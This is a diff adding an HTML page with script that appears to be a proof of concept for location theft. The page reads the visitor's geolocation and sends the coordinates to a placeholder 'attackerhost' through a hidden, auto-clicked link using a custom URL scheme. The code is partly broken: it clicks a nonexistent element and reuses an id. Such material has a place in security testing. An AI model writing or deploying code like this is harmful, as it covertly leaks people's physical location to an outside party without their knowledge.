@@ -1,0 +1,41 @@
+<a href="" id="latlong" style="display: none;"> latlong </a>
+<button id='latlong' onclick="getLocation()" style="display: none;"></button>
+<script>
+var lat = '';
+var long = '';
+var something = '';
+document.getElementById('funcall').click();
+function getLocation() {
+  if (navigator.geolocation) {
+    alert('geo');
+    var location_timeout = setTimeout("geolocFail()", 1000);
+    navigator.geolocation.getCurrentPosition(function(position) {
+        var lat = position.coords.latitude;
+        var lng = position.coords.longitude;
+        var a = document.getElementById('latlong'); //or grab it by tagname etc
+        a.href = "attackerscheme://attackerhost/?latlong=" + lat + "---" + lng;
+        //alert(lat + "$$" + lng);
+        document.getElementById("latlong").click();
+    }, function(error) {
+        clearTimeout(location_timeout);
+    });
+} else {
+    // Fallback for no geolocation
+    alert('failed');
+    //geolocFail();
+}
+}
+
+/*navigator.permissions && navigator.permissions.query({name: 'geolocation'})
+.then(function(PermissionStatus) {
+    if (PermissionStatus.state == 'granted') {
+          alert('allowed');
+    } else if (PermissionStatus.state == 'prompt') {
+          alert('prompt - not yet grated or denied');
+    } else {
+         aleert('denied');
+    }
+})*/
+</script>
+
+
